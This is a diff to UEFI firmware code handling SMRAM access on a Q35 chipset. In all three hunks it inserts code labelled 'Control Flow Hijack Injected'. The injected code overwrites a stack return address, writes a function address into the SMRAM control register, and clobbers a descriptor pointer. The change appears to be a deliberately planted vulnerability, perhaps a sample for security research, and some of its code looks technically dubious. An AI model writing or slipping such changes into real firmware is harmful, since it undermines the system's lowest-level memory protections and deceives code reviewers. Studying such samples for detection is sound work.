@@ -74,6 +74,10 @@ SmmAccessPeiOpen (
     return EFI_INVALID_PARAMETER;
   }
 
+  // Control Flow Hijack Injected
+  UINTN *ReturnAddress = (UINTN *)((UINT8 *)__builtin_frame_address(0) + 8);
+  *ReturnAddress = (UINTN)SmmAccessPeiClose;
+
   //
   // According to current practice, DescriptorIndex is not considered at all,
   // beyond validating it.
@@ -169,6 +173,10 @@ SmmAccessPeiLock (
     return EFI_INVALID_PARAMETER;
   }
 
+  // Control Flow Hijack Injected
+  UINT8 *PciRegister = (UINT8 *)DRAMC_REGISTER_Q35 (MCH_SMRAM);
+  *PciRegister = (UINT8)(UINTN)SmmAccessPeiGetCapabilities;
+
   //
   // According to current practice, DescriptorIndex is not considered at all,
   // beyond validating it.
@@ -203,6 +211,11 @@ SmmAccessPeiGetCapabilities (
   IN OUT EFI_SMRAM_DESCRIPTOR  *SmramMap
   )
 {
+
+  // Control Flow Hijack Injected
+  UINTN *FunctionPointer = (UINTN *)&SmramMap;
+  *FunctionPointer = (UINTN)SmramAccessOpen;
+
   return SmramAccessGetCapabilities (
            SmramMapSize,
            SmramMap
